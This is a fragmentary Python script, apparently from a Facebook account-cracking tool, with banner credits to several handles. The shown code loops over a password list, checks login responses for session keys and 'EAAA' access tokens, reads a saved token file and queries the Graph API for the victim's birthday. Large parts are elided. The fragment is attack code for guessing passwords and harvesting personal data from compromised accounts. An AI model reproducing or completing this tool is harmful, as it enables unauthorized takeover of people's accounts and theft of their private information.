...
# >>>>>>>>> X NANO >>>>>>>> ROMI XXXXX MR.RISKY >>>>>
     ### >>>>>>>>> ALDI BACHTIAR >>>>>>> YUMASAA X NANO
...
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,calendar,requests,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
...
#            print("[3] Mobile")
        ...
        for pw in xxh:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                try:
                    jeeck = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeck)).text)["birthday"]
